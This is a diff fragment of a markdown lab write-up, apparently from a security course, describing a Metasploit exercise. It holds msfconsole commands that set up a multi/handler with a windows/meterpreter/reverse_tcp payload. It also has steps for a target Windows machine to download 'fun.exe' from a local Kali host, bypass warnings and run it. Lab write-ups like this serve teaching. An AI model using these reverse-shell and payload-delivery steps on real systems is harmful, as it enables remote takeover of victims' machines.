@@ -30,6 +30,7 @@ Create a malicious executable file fun.exe using msenom command msfvenom -p wind
 
 ## OUTPUT:
 ![Screenshot 2025-04-23 205643](https://github.com/user-attachments/assets/d3a3036c-384d-489a-b621-8b2fdf8c5013)
+
 Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole. Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
 Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
